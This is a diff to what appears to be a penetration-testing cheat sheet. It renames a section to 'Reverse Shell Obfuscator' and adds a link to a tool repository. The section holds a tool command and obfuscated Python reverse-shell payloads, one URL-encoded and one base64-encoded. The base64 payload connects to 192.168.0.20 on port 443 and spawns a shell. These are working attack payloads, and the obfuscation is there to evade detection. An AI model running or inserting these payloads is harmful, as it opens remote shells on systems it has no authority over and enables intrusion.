@@ -103,7 +103,7 @@ https://3v4l.org/
 https://malwaredecoder.com/  
 https://hackvertor.co.uk/public
 
-### Shell Obufscator
+### Reverse Shell Obfuscator
 e.g.  
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
 ```
@@ -126,6 +126,7 @@ py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket
 ```
 cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
 ```
+https://github.com/rodolfomarianocy/hackshell  
 
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
 
